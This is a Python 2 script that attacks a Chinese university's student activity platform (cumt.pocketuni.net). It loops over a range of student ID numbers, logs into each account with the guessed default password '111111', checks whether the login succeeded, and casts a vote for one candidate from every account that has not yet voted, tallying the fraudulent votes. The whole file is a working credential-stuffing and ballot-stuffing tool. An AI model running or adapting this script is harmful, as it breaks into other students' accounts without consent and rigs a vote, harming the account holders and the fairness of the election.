# coding=utf-8  
import urllib2
import cookielib
import re

pid = [3715928]#候选人的ID
sum0=0#成功投票的人数
def Vote():
    for id in pid:
        # vote
        params = 'action=dovote&guid=d31ad751-941b-0ed7-9d3f-796bc1481d43&ops=%d&wxparam=oNrjcvtyl9jPox0MzWSXzabDCrv8%7Cd31ad751-941b-0ed7-9d3f-796bc1481d43%7C005d356be971c7a1acc796fe241288ce%7C1516093621%7Cvote' % id 
        req = urllib2.Request("http://cumt.pocketuni.net/index.php?app=event&mod=Front&act=vote", params)
        page = opener.open(req)
        

for sno in range(8143131, 8143200):
    print sno
    # create cookie
    cookieJar = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookieJar))

    # login
    params = 'school=%E4%B8%AD%E5%9B%BD%E7%9F%BF%E4%B8%9A%E5%A4%A7%E5%AD%A6&sid=622&number=0' + str(sno) + '&password=111111&login=%E7%99%BB+%E5%BD%95'
    req = urllib2.Request("http://cumt.pocketuni.net/index.php?app=home&mod=Public&act=doLogin", params)
    page = opener.open(req)
    m=re.search(r'中国矿业大学大学生实践成长服务平台',page.read())#判断能否登陆成功
    if m:
        print '登陆成功'
    else:
        print '登录失败'
    
    req=urllib2.Request('http://cumt.pocketuni.net/index.php?app=event&mod=Front&act=index&id=160367')
    page=opener.open(req)
    m1=re.search(r'票已投完',page.read())#判断是不是可以投票
    if m1:
        print '该账号已投票'
    else:
        Vote()
        print '投票成功'
        sum0+=1
print "成功投票%d人"%sum0